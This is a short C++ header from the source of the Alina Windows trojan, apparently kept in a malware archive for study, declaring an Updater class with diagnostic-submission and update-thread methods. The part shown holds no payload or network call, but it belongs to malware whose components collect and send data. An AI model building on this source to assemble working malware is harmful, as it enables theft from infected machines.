/*
  name      Alina
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "Settings.h"

class Updater
{
public:
	Updater();
	~Updater();

	void addDiag(std::string &diag);
	void forceSubmit();

	static Updater *instance();
private:
	static void __stdcall updateThread(Updater *u);
	std::string diag;

	CRITICAL_SECTION csdiag;

	bool force;
};

